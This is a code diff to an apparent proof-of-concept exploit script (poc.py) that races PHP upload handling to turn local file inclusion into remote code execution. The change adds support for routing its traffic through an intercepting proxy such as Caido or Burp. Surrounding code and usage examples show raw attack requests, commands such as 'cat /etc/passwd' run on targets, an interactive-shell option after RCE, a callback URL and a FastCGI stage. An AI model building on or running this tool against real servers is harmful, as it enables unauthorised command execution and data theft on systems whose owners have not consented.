@@ -32,11 +32,67 @@ import urllib.error
 import urllib.parse
 from typing import Optional
 
+# ─── proxy (Caido / Burp / any HTTP forward proxy) ──────────────────────────
+# Set once by set_proxy() from --proxy; read by make_socket() and req_target()
+# so that both the urllib calls and the raw-socket race traffic are logged.
+PROXY: Optional[tuple[str, int]] = None
+
+
+def set_proxy(proxy_url: str, verify: bool = True,
+              cafile: Optional[str] = None) -> tuple[str, int]:
+    """Route every HTTP(S) request through proxy_url. Returns (host, port)."""
+    global PROXY
+    u = urllib.parse.urlparse(proxy_url if "://" in proxy_url else "http://" + proxy_url)
+    if not u.hostname:
+        raise ValueError(f"invalid proxy URL: {proxy_url}")
+    PROXY = (u.hostname, u.port or 8080)
+
+    # urllib side: install one opener so every urlopen() in this module uses it.
+    ctx = ssl.create_default_context(cafile=cafile)
+    if not verify:
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+    proxy_str = f"http://{PROXY[0]}:{PROXY[1]}"
+    urllib.request.install_opener(urllib.request.build_opener(
+        urllib.request.ProxyHandler({"http": proxy_str, "https": proxy_str}),
+        urllib.request.HTTPSHandler(context=ctx),
+    ))
+    return PROXY
+
+
+def req_target(host: str, port: int, path: str, use_tls: bool) -> str:
+    """Request target for a raw-socket request line.
+
+    A forward proxy needs the absolute form for plain HTTP; inside a CONNECT
+    tunnel — and with no proxy at all — the origin form is what PHP expects.
+    """
+    if PROXY and not use_tls:
+        return f"http://{host}:{port}{path}"
+    return path
+
+
 # ─── helpers ────────────────────────────────────────────────────────────────
 
 def make_socket(host: str, port: int, use_tls: bool,
                 verify: bool = True, cafile: Optional[str] = None) -> socket.socket:
-    s = socket.create_connection((host, port), timeout=30)
+    s = socket.create_connection(PROXY or (host, port), timeout=30)
+    if PROXY and use_tls:
+        # CONNECT tunnel, so the proxy can terminate TLS and log the exchange.
+        s.sendall(
+            f"CONNECT {host}:{port} HTTP/1.1\r\n"
+            f"Host: {host}:{port}\r\n"
+            f"Connection: keep-alive\r\n\r\n".encode()
+        )
+        resp = b""
+        while b"\r\n\r\n" not in resp:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            resp += chunk
+        status = resp.split(b"\r\n", 1)[0].decode(errors="replace")
+        if " 200 " not in status:
+            s.close()
+            raise OSError(f"proxy CONNECT to {host}:{port} failed: {status or 'no response'}")
     if use_tls:
         ctx = ssl.create_default_context(cafile=cafile)
         if not verify:
@@ -214,7 +270,7 @@ def slow_upload(host: str, port: int, path: str, use_tls: bool,
     content_length = len(body)
 
     request_line = (
-        f"POST {path} HTTP/1.1\r\n"
+        f"POST {req_target(host, port, path, use_tls)} HTTP/1.1\r\n"
         f"Host: {host}:{port}\r\n"
         f"Cookie: PHPSESSID={session_id}\r\n"
         f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
@@ -333,7 +389,7 @@ def _disturb_double_upload(host, port, path, use_tls, session_id, upload_key):
     try:
         s = make_socket(host, port, use_tls)
         req = (
-            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+            f"POST {req_target(host, port, path, use_tls)} HTTP/1.1\r\nHost: {host}:{port}\r\n"
             f"Cookie: PHPSESSID={session_id}\r\n"
             f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
             f"Content-Length: {content_length}\r\nConnection: close\r\n\r\n"
@@ -363,7 +419,7 @@ def _disturb_abort(host, port, path, use_tls, session_id, upload_key):
     try:
         s = make_socket(host, port, use_tls)
         req = (
-            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+            f"POST {req_target(host, port, path, use_tls)} HTTP/1.1\r\nHost: {host}:{port}\r\n"
             f"Cookie: PHPSESSID={session_id}\r\n"
             f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
             f"Content-Length: {content_length}\r\nConnection: close\r\n\r\n"
@@ -778,7 +834,7 @@ def probe(host: str, port: int, path: str, use_tls: bool) -> dict:
     try:
         s = make_socket(host, port, use_tls)
         req_bytes = (
-            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+            f"POST {req_target(host, port, path, use_tls)} HTTP/1.1\r\nHost: {host}:{port}\r\n"
             f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
             f"Content-Length: {content_length}\r\nConnection: close\r\n\r\n"
         ).encode()
@@ -1049,6 +1105,8 @@ def main():
             "  python3 poc.py http://target/page.php 'cat /etc/passwd' --lfi-param page\n"
             "  python3 poc.py http://target/ 'whoami' --rounds 20 --chunk-delay 0.001\n"
             "  python3 poc.py https://target/ 'id' --no-verify\n"
+            "  python3 poc.py https://target/ 'id' --caido --cafile caido_ca.pem\n"
+            "  python3 poc.py http://target/ 'id' --proxy http://127.0.0.1:8080\n"
         )
     )
     p.add_argument("url",     help="Target PHP URL, e.g. http://192.168.1.10/index.php")
@@ -1069,7 +1127,13 @@ def main():
     p.add_argument("--no-verify", action="store_true",
                    help="Disable TLS certificate verification (lab/self-signed only — MITM risk)")
     p.add_argument("--cafile", default=None,
-                   help="Path to CA bundle for TLS verification")
+                   help="Path to CA bundle for TLS verification (point this at the "
+                        "proxy's CA when using --proxy against an https target)")
+    p.add_argument("--proxy", default=None, metavar="URL",
+                   help="Send all HTTP(S) traffic through an intercepting proxy, "
+                        "e.g. http://127.0.0.1:8080 — for logging the run in Caido/Burp")
+    p.add_argument("--caido", action="store_true",
+                   help="Shorthand for --proxy http://127.0.0.1:8080")
     p.add_argument("--interactive", "-i", action="store_true",
                    help="Drop into interactive shell after first successful RCE (requires --lfi-param)")
     p.add_argument("--callback", default=None, metavar="URL",
@@ -1087,6 +1151,27 @@ def main():
     if not host:
         print("[-] Invalid URL")
         sys.exit(1)
+
+    proxy_url = args.proxy or ("http://127.0.0.1:8080" if args.caido else None)
+    if proxy_url:
+        try:
+            phost, pport = set_proxy(proxy_url, verify=not args.no_verify,
+                                     cafile=args.cafile)
+        except ValueError as e:
+            print(f"[-] {e}")
+            sys.exit(1)
+        try:
+            socket.create_connection((phost, pport), timeout=5).close()
+        except OSError as e:
+            print(f"[-] Proxy {phost}:{pport} unreachable: {e}")
+            sys.exit(1)
+        print(f"[*] Proxy          : http://{phost}:{pport} (all HTTP traffic logged)")
+        if use_tls and not args.no_verify and not args.cafile:
+            print("    [!] https target: the proxy's CA is not trusted here — pass "
+                  "--cafile <caido_ca.pem>\n"
+                  "        (Caido: Settings > CA Certificate > Export) or --no-verify, "
+                  "or TLS will fail")
+        print("    [!] The FastCGI stage talks raw FCGI to php-fpm and bypasses the proxy")
 
     if args.probe_only:
         info = probe(host, port, path, use_tls)
